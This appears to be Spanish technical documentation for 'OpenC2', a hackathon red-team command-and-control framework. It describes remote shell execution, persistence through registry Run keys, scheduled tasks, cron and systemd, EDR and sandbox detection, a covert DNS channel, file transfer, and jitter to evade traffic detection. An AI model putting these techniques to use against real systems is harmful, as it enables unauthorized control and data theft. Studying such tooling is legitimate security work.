# OpenC2 v1.0 — Documentación Técnica

> Hackathon Talento Tech 2026 | Ciberseguridad Ofensiva  
> Modelo IA: Claude Sonnet 4.6 (claude-sonnet-4-6) — Anthropic

---

## 1. Resumen Ejecutivo

OpenC2 es un framework C2 (Command & Control) construido desde cero para demostrar capacidades avanzadas de red team. Combina criptografía moderna, trazabilidad blockchain, arquitectura pub/sub asíncrona y detección OPSEC activa en una sola plataforma deployable con un clic.

**Stack tecnológico:**
- **Backend**: Python 3.10+ / FastAPI / asyncio / uvicorn
- **Frontend**: React 18 + Vite + Tailwind CSS / TypeScript
- **Criptografía**: `cryptography` (hazmat) — RSA-3072, AES-256-GCM, HMAC-SHA256
- **Blockchain**: Solana (devnet/testnet/mainnet-beta) vía `solana` + `solders`
- **Persistencia**: SQLite (cola de tareas), JSONL (audit trail)
- **Auth**: PyJWT HS256 + token estático legacy
- **DNS**: `dnslib` servidor UDP propio

---

## 2. Arquitectura del Sistema

```
┌─────────────────────────────────────────────────────────────┐
│                    OPERADOR                                  │
│  Dashboard React ──SSE──► App.tsx ◄──REST/JWT──► server     │
└──────────────────────────────────────────────────────────────┘
                              │
                    ┌─────────▼─────────┐
                    │   OpenC2 Server    │
                    │   FastAPI/asyncio  │
                    │                   │
                    │ ┌───────────────┐ │
                    │ │ AgentManager  │ │  asyncio.Queue por agente
                    │ │ + PubSub      │ │  SQLite fallback (SIGTERM)
                    │ └───────────────┘ │
                    │ ┌───────────────┐ │
                    │ │ AuditTrail    │ │  SHA-256 blockchain → Solana
                    │ └───────────────┘ │
                    │ ┌───────────────┐ │
                    │ │ Observability │ │  métricas internas SSE
                    │ └───────────────┘ │
                    └────────┬──────────┘
                   WebSocket │         │ DNS/UDP
              (cifrado)      │         │ (base32 + AES opcional)
                    ┌────────▼──────────────────┐
                    │        OpenC2 Agent        │
                    │        Python asyncio       │
                    │                            │
                    │  shell · sysinfo · opsec   │
                    │  persist · filetransfer     │
                    │  + hot-swap RSA-PSS         │
                    └────────────────────────────┘
```

---

## 3. Protocolo de Comunicación — OpenC2 Protocol v1

### 3.1 Tipos de Mensaje

| Tipo | Dirección | Descripción |
|---|---|---|
| `HELLO` | Agent → Server | Presentación: hostname, OS, arch, user, capabilities, label |
| `HANDSHAKE` | Server ↔ Agent | Intercambio de clave de sesión RSA-OAEP |
| `HEARTBEAT` | Agent → Server | Latido periódico con CPU/RAM/plugins |
| `TASK` | Server → Agent | Comando a ejecutar |
| `RESULT` | Agent → Server | Respuesta de un task |
| `EVENT` | Agent → Server | Evento asíncrono (alertas OPSEC proactivas) |
| `ERROR` | Bidireccional | Error recuperable |
| `BYE` | Bidireccional | Desconexión limpia |

### 3.2 Flujo de Handshake

```
Agent                                    Server
  │──── HELLO (en claro) ─────────────────►│
  │     {hostname, os, arch, user,          │
  │      capabilities, agent_pub_pem,        │
  │      label?}                            │
  │                                         │
  │◄─── HANDSHAKE (en claro) ───────────────│
  │     {server_pub_pem, agent_id,          │
  │      challenge (nonce 32B)}             │
  │                                         │
  │──── HANDSHAKE (en claro) ─────────────►│
  │     {wrapped_session_key (RSA-OAEP),    │
  │      challenge_ack (HMAC session_key    │
  │      sobre el nonce)}                   │
  │                                         │
  │◄─── HANDSHAKE (cifrado AES) ───────────│
  │     {ok: true, agent_id}                │
  │                                         │
  │═══════ Sesión cifrada AES-256-GCM ════│
```

### 3.3 Formato de Mensaje en Tránsito

```json
{
  "id": "<uuid4>",
  "type": "TASK",
  "agent_id": "<uuid4>",
  "ts": 1719475200.0,
  "sig": "<HMAC-SHA256-base64>",
  "envelope": {
    "ciphertext": "<base64>",
    "nonce": "<12B-base64>",
    "tag": "<16B-base64>"
  }
}
```

---

## 4. Esquema Criptográfico

### 4.1 Capas de Seguridad

```
Datos en claro
    │
    ▼ AES-256-GCM (session_key, nonce 12B, AAD = msg.id)
Ciphertext + tag GCM (16B)
    │
    ▼ HMAC-SHA256 (session_key)
Firma de integridad por mensaje
    │
    ▼ [Solo handshake] RSA-3072 OAEP + SHA-256
session_key cifrada con pub key del servidor
```

### 4.2 Parámetros Criptográficos

| Primitiva | Parámetro | Justificación |
|---|---|---|
| RSA | 3072 bits | NIST SP 800-131A rev2: seguro hasta 2030+ |
| RSA padding | OAEP + SHA-256 | Resistente a ataques de texto elegido |
| AES | 256 bits GCM | Cifrado autenticado, nonce único 12B |
| HMAC | SHA-256 | MAC 256 bits por mensaje |
| Plugin signing | RSA-PSS + SHA-256 | Firma de código antes de importar |
| JWT | HS256 | Token de sesión del operador con expiración |

### 4.3 Hot-Swap de Plugins (Zero-Trust de Código)

```python
# Servidor firma el código antes de enviarlo:
signature = rsa_pss_sign(server_private_key, plugin_code_bytes)

# Agente verifica antes de importar — sin excepción:
if not rsa_pss_verify(server_public_key, plugin_code_bytes, signature):
    raise ValueError("Plugin rechazado: firma inválida")
# Solo si verifica → importación dinámica en archivo temporal
```

---

## 5. Componentes del Servidor

### 5.1 AgentManager

- **Registro**: UUID único + `label` opcional por instancia
- **`host_key`**: `hostname` (sin label) o `hostname:label` (con label)
- **PubSub broker**: asyncio.Queue por tópico, wildcard `"*"`
- **Outbox**: `asyncio.Queue[Message]` por agente
- **SQLite queue**: `flush_to_db()` en SIGTERM; `_load_pending_for_host(host_key)` al reconectar

### 5.2 AuditTrail (Blockchain SHA-256)

```
Block #0:  prev_hash="0"*64  entry={agent_id, command, result, ts}
Block #1:  prev_hash=hash_0  ...
Block #N:  prev_hash=hash_{N-1} ...
```

- Almacenado en `audit_trail.jsonl` (append-only)
- Verificable con `GET /api/audit/verify`
- Hash de cada bloque anclado en Solana: `openc2:block#<id>:<hash>`

### 5.3 Canales de Comunicación

**WebSocket** (primario):
- Handshake RSA-3072 completo
- Todo post-handshake cifrado AES-256-GCM
- `_sender_loop` consume `agent.outbox`
- `_dispatch` enruta HEARTBEAT/RESULT/EVENT/BYE

**DNS Covert** (alternativo):
- Servidor UDP propio en `:15353` (puerto alto, sin necesidad de Admin en Windows)
- Queries TXT con payload base32-encoded
- AES-256-GCM opcional con `DNS_SHARED_KEY` (32B hex)
- Backwards compatible: sin clave opera sin cifrado

---

## 6. Plugins del Agente

### 6.1 shell — Ejecución de Comandos

**Fix crítico**: `stdin=asyncio.subprocess.DEVNULL` en ambas ramas (Windows/Linux).  
Sin esto, comandos como `cmd`, `time`, `pause` esperan input del usuario y causan timeout.

**Alias automáticos** (Windows):
| Input del operador | Comando real ejecutado |
|---|---|
| `time` | `time /t` |
| `date` | `date /t` |
| `cmd` | Mensaje explicativo (shell interactivo bloqueado) |

### 6.2 sysinfo — Información del Sistema

Acciones: `summary`, `processes` (top 15), `network` (conexiones TCP), `env`

### 6.3 opsec — Detección OPSEC

| Acción | Detecta |
|---|---|
| `edr_check` | CrowdStrike, SentinelOne, Carbon Black, Defender ATP... |
| `defender_status` | Windows Defender: real-time, cloud, signatures |
| `sysmon_check` | Sysmon activo (proceso + servicio) |
| `event_scan` | Event IDs 4688, 4624, 7045 en últimas N horas |
| `net_monitor` | Wireshark, tcpdump, NetworkMiner... |
| `sandbox_detect` | VMware, VirtualBox, Hyper-V, análisis automático |
| `full_report` | Todos los checks + recomendaciones |
| `watch_start` | Monitoreo continuo, alertas via RESULT (EVENT asíncrono) |

**Niveles**: CRITICAL > HIGH > MEDIUM > LOW > CLEAN

### 6.4 persist — Persistencia Post-Reboot

| Mecanismo | OS | Riesgo | Técnica |
|---|---|---|---|
| `windows_run_key` | Windows | HIGH | `HKCU\...\Run` via winreg |
| `windows_scheduled_task` | Windows | MEDIUM | `schtasks /create` |
| `linux_cron` | Linux | MEDIUM | `crontab` con marcador `# openc2:{name}` |
| `linux_systemd` | Linux | MEDIUM | `/etc/systemd/system/{name}.service` |

Acciones: `install`, `uninstall`, `status`

### 6.5 filetransfer — Transferencia de Archivos

| Acción | Descripción |
|---|---|
| `upload` | Lee archivo local → `content_b64` + `sha256` en RESULT |
| `download` | Recibe `content_b64` → escribe archivo local |
| `list` | Listado de directorio con tamaños |
| `checksum` | SHA-256 del archivo |
| `mkdir` | Crear directorio |
| `delete` | Borrar (requiere `confirm=true`) |

Límite: 10MB por operación. I/O con `asyncio.to_thread`.

---

## 7. Multi-Agente en el Mismo Host

### 7.1 Problema

Sin labels, dos agentes en el mismo host comparten `hostname`, causando colisiones en la cola SQLite y en el dashboard.

### 7.2 Solución

```python
# HelloPayload.label: str = ""   ← campo nuevo en el protocolo
# AgentState.host_key property:
@property
def host_key(self) -> str:
    return f"{self.hostname}:{self.label}" if self.label else self.hostname
```

**Uso**:
```bash
python agent.py --server ws://server:8000/ws --label recon
python agent.py --server ws://server:8000/ws --label lateral
AGENT_LABEL=pivot python agent.py --server ws://server:8000/ws
```

Dashboard: badge morado con el label en AgentList.

---

## 8. JWT Authentication

```
POST /api/auth/token  {"password": "openc2-dev-token"}
→ {"token": "<jwt>", "expires_in": 86400}

Header: X-Operator-Token: <jwt>
Query:  ?token=<jwt>  (para EventSource)
```

`_verify_token`: acepta JWT válido O token estático (retrocompatibilidad).

---

## 9. Heartbeat Jitter Anti-Fingerprint

```python
jitter = random.uniform(1.0 - HEARTBEAT_JITTER, 1.0 + HEARTBEAT_JITTER)
await asyncio.sleep(HEARTBEAT_INTERVAL * jitter)
# Con HEARTBEAT_INTERVAL=10, HEARTBEAT_JITTER=0.3 → 7s–13s aleatorio
```

Rompe la detección de tráfico periódico regular.

---

## 10. Solana Blockchain Anchoring

| Red | Uso | Costo |
|---|---|---|
| `devnet` | Desarrollo / hackathon | Gratis (airdrop automático) |
| `testnet` | Pruebas | Gratis |
| `mainnet-beta` | Producción | SOL real (no airdrop) |

Memo format: `openc2:block#42:a3f9d8e2b1c4...`  
Explorer: `https://explorer.solana.com/tx/<sig>?cluster=devnet`

Fallback multi-RPC automático si el endpoint primario falla.

---

## 11. Dashboard React

### 11.1 Formatters de Output (App.tsx)

| Formatter | Condición de activación | Muestra |
|---|---|---|
| `formatShellOutput` | `"cmd" in output` | stdout + stderr + exit code |
| `formatOpsecOutput` | `"overall_risk" in output` | tabla riesgo con colores |
| `formatSysinfoSummary` | `"hostname"+"os"+"arch"` | tabla: host, OS, CPU, RAM |
| `formatProcessList` | `Array[{pid}]` | tabla: PID, CPU%, MEM%, user |
| `formatNetworkOutput` | `"connections"` | tabla: local, remote, status |
| `formatEnvVars` | muchas strings | clave=valor, truncado 70 chars |

### 11.2 Terminal Shortcuts

```
shell <cmd>                      → shell.exec {cmd}
sysinfo / ps / netstat / env     → sysinfo.*
opsec [edr|defender|sysmon...]   → opsec.*
persist [status|install|...]     → persist.* (args clave=valor)
filetransfer [list|upload|...]   → filetransfer.*
workflow A -> B -> C             → secuencial via /api/agents/{id}/workflow
snapshot / snapshot diff         → REST directo
doctor / audit verify            → REST directo
plugin action {json}             → genérico
```

`parseKvArgs("key=value key2=val2")` convierte formato texto a objeto para persist y filetransfer.

---

## 12. Cola SQLite Persistente

### 12.1 Schema

```sql
CREATE TABLE IF NOT EXISTS pending_tasks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT NOT NULL,   -- en realidad host_key = hostname[:label]
    task_json TEXT NOT NULL,
    created_at REAL NOT NULL
);
```

### 12.2 Ciclo de vida

1. **SIGTERM/SIGINT**: `flush_to_db()` persiste outboxes → SQLite
2. **Reinicio del servidor**: base de datos intacta
3. **Agente reconecta**: `_load_pending_for_host(host_key)` restaura tareas al outbox

---

## 13. Decisiones de Diseño

| Decisión | Alternativa rechazada | Razón |
|---|---|---|
| RSA-3072 | RSA-4096 | NIST 2030+, menor overhead |
| AES-GCM | AES-CBC + MAC | GCM cifra y autentica en una pasada |
| asyncio.Queue outbox | WebSocket broadcast | Garantiza orden + SQLite fallback |
| SQLite queue | Redis | Cero dependencias externas |
| SSE en dashboard | Polling | Push nativo del browser, una conexión |
| Plugin RSA-PSS | Sin firma | Zero-trust: no ejecuta código sin verificar |
| Jitter heartbeat | Intervalo fijo | Anti-fingerprinting de tráfico |
| stdin=DEVNULL | stdin abierto | Previene cuelgue en shells interactivos |
| label en HelloPayload | UUID forzado | El operador controla el nombre descriptivo |

---

## 14. Variables de Entorno

| Variable | Default | Descripción |
|---|---|---|
| `OPERATOR_TOKEN` | `openc2-dev-token` | Token del operador |
| `JWT_SECRET` | auto-generado | Secreto JWT HS256 |
| `JWT_EXPIRE_HOURS` | `24` | Expiración JWT |
| `SOLANA_ANCHOR` | `true` | Anclaje blockchain |
| `SOLANA_NETWORK` | `devnet` | Red Solana |
| `SOLANA_WALLET_PATH` | `solana_wallet.json` | Wallet |
| `HEARTBEAT_INTERVAL` | `10` | Segundos entre heartbeats |
| `HEARTBEAT_JITTER` | `0.3` | Variación ±30% |
| `DNS_SHARED_KEY` | `` | 64 hex chars (AES canal DNS) |
| `QUEUE_DB_PATH` | `pending_tasks.db` | SQLite queue |
| `C2_HOST` | `0.0.0.0` | IP de escucha |
| `C2_PORT` | `8000` | Puerto WS+REST |
| `C2_DNS_PORT` | `15353` | Puerto UDP DNS (>1024, sin permisos admin) |
| `AGENT_LABEL` | `` | Label del agente |

---

## 15. Flujo Completo de una Operación

```
Operador: "shell whoami"
     │
     ▼ Terminal.tsx → POST /api/agents/{id}/task
     │   {"plugin":"shell","action":"exec","args":{"cmd":"whoami"}}
     │
     ▼ AgentManager.enqueue_task()
     │   outbox.put(msg_firmado_HMAC)
     │
     ▼ websocket._sender_loop
     │   AES-256-GCM encrypt → WebSocket send
     │
     ▼ Agent plugin.execute("exec", {"cmd":"whoami"})
     │   asyncio.create_subprocess_shell("whoami", stdin=DEVNULL)
     │   stdout="angel\r\n", returncode=0, 45ms
     │
     ▼ Agent → RESULT (cifrado) → Server
     │
     ▼ manager.handle_result()
     │   AuditTrail.add_entry() → block_hash
     │   solana_anchor(block_hash)  [fire-and-forget]
     │   pubsub.publish("agents.result", {...})
     │
     ▼ SSE /api/stream → dashboard
     │
     ▼ App.tsx handleSSE → formatShellOutput()
Terminal: "angel"   (stdout limpio, 45ms)
```

---

## 16. Aviso de Seguridad

Este framework es **exclusivamente para entornos de laboratorio autorizados**:

- Nunca usar sin autorización escrita del propietario del sistema
- Cambiar `OPERATOR_TOKEN` en cualquier despliegue real
- `JWT_SECRET` debe ser generado de forma segura y persistido
- Las claves RSA se generan automáticamente en `keys/` al primer inicio
- El canal DNS requiere privilegios para puerto <1024
- `persist` requiere privilegios elevados en algunos mecanismos
- `filetransfer delete` requiere `confirm=true` explícito
